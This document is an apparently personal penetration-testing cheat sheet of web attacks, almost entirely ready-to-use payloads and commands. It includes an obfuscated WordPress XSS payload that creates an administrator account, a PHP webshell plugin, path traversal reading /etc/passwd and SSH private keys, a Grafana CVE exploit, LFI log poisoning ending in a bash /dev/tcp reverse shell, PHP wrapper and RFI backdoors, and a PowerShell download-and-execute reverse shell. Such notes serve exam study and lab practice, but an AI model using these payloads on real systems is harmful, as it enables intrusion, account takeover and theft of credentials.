
# Web Application Attacks

## API

REST API
json

### old version of API

## XSS

The most common special characters used for this purpose include:
```< > ' " { } ;```

### WordPress

#### gather nonce

```javascript
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];
```

#### create user

```javascript
var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);
```

#### JS Compress

<https://jscompress.com/>

#### convert to UTF-16

```javascript
function encode_to_javascript(string) {
            var input = string
            var output = '';
            for(pos = 0; pos < input.length; pos++) {
                output += input.charCodeAt(pos);
                if(pos != (input.length - 1)) {
                    output += ",";
                }
            }
            return output;
        }
        
let encoded = encode_to_javascript('insert_minified_javascript')
console.log(encoded)
```

#### execute

```bash
curl -i http://offsecwp --user-agent "<script>eval(String.fromCharCode(118,97,114,32,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,44,114,101,113,117,101,115,116,85,82,76,61,34,47,119,112,45,97,100,109,105,110,47,117,115,101,114,45,110,101,119,46,112,104,112,34,44,110,111,110,99,101,82,101,103,101,120,61,47,115,101,114,34,32,118,97,108,117,101,61,34,40,91,94,34,93,42,63,41,34,47,103,59,97,106,97,120,82,101,113,117,101,115,116,46,111,112,101,110,40,34,71,69,84,34,44,114,101,113,117,101,115,116,85,82,76,44,33,49,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,41,59,118,97,114,32,110,111,110,99,101,77,97,116,99,104,61,110,111,110,99,101,82,101,103,101,120,46,101,120,101,99,40,97,106,97,120,82,101,113,117,101,115,116,46,114,101,115,112,111,110,115,101,84,101,120,116,41,44,110,111,110,99,101,61,110,111,110,99,101,77,97,116,99,104,91,49,93,44,112,97,114,97,109,115,61,34,97,99,116,105,111,110,61,99,114,101,97,116,101,117,115,101,114,38,95,119,112,110,111,110,99,101,95,99,114,101,97,116,101,45,117,115,101,114,61,34,43,110,111,110,99,101,43,34,38,117,115,101,114,95,108,111,103,105,110,61,97,116,116,97,99,107,101,114,38,101,109,97,105,108,61,97,116,116,97,99,107,101,114,64,111,102,102,115,101,99,46,99,111,109,38,112,97,115,115,49,61,97,116,116,97,99,107,101,114,112,97,115,115,38,112,97,115,115,50,61,97,116,116,97,99,107,101,114,112,97,115,115,38,114,111,108,101,61,97,100,109,105,110,105,115,116,114,97,116,111,114,34,59,40,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,41,46,111,112,101,110,40,34,80,79,83,84,34,44,114,101,113,117,101,115,116,85,82,76,44,33,48,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,116,82,101,113,117,101,115,116,72,101,97,100,101,114,40,34,67,111,110,116,101,110,116,45,84,121,112,101,34,44,34,97,112,112,108,105,99,97,116,105,111,110,47,120,45,119,119,119,45,102,111,114,109,45,117,114,108,101,110,99,111,100,101,100,34,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,112,97,114,97,109,115,41,59))</script>" --proxy 127.0.0.1:8080
```

#### add plugin

<https://www.jckhmr.net/create-a-wordpress-webshell-plugin/>

```php
<?php
/**
* Plugin Name: WonderfulWebshell
* Plugin URI: https://github.com/jckhmr/wonderfullwebshell
* Description: Wordpress webshell used for demo purposes only
* Version: 1.0
* Author: jckhmr
* Author URI: https://jckhmr.net
* License: https://nosuchlicense
*/

if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
```

#### wpscan

<https://wpscan.com/>

```bash
wpscan --url http://
```

## Directory Traversal

```bash
curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../etc/passwd
curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa

chmod 400 id_rsa
ssh offsec@192.168.152.16 -p 2222 -i id_rsa
```

### Grafana

#### CVE-2021-43798

##### linux

<https://www.exploit-db.com/exploits/50581>

```bash
python3 CVE-2021-43798.py -H http://192.168.152.16:3000
Read file > /etc/passwd
```

##### windows

```bash
python3 CVE-2021-43798.py -H http://192.168.152.193:3000 
Read file > \\users\\install.txt

curl --path-as-is http://192.168.152.193:3000/public/plugins/text/..\\..\\..\\..\\..\\..\\..\\..\\Users\\install.txt
curl --path-as-is http://192.168.152.193:3000/public/plugins/text/../../../../../../../../../Users/install.txt
curl --path-as-is http://192.168.152.193:3000/public/plugins/text/../../../../../../../../..\\Users\\install.txt
```

### Apache 2.4.49

```bash
curl http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
```

## File Inclusion

### LFI

#### User-Agent

```
User-Agent: Mozilla/5.0 <?php echo system($_GET['cmd']); ?>
```

#### reverse shell by GET parameter

```
nc -lvnp 4444

bash -c "bash -i >& /dev/tcp/192.168.45.195/4444 0>&1"

index.php?page=../../../../../../var/log/apache2/access.log&cmd=bash%20%2Dc%20%22bash%20%2Di%20%3E%26%20%2Fdev%2Ftcp%2F192%2E168%2E45%2E195%2F4444%200%3E%261%22
```

### PHP Wrapper

#### php://filter

```
index.php?page=php://filter/resource=admin.php

index.php?page=php://filter/convert.base64-encode/resource=/var/www/html/backup.php
```

#### data://

```
index.php?page=data://text/plain,<?php%20echo%20system($_GET["cmd"]);?>

index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls
```

### RFI

```
python3 -m http.server 80

index.php?page=http://192.168.45.235/simple-backdoor.php&cmd=ls
```

## File Upload

### Using Executable Files

### Using Non-Executable Files

```bash
ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kali/.ssh/id_rsa): fileup
...

cat fileup.pub > authorized_keys

../../../../../../../../root/.ssh/authorized_keys
```

## Command Injection

### found injection symbols

` = %60

`" " ' ; | & && || $ ( )`

<https://gabb4r.gitbook.io/oscp-notes/cheatsheet/command-injection-cheatsheet>

### execute command

```

(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell

(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell

```

```powershell
IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.45.223/powercat.ps1");powercat -c 192.168.45.223 -p 4444 -e powershell

IEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F192.168.45.235%2Fpowercat.ps1%22)%3Bpowercat%20-c%20192.168.45.235%20-p%204444%20-e%20powershell
```

## SQL Injection
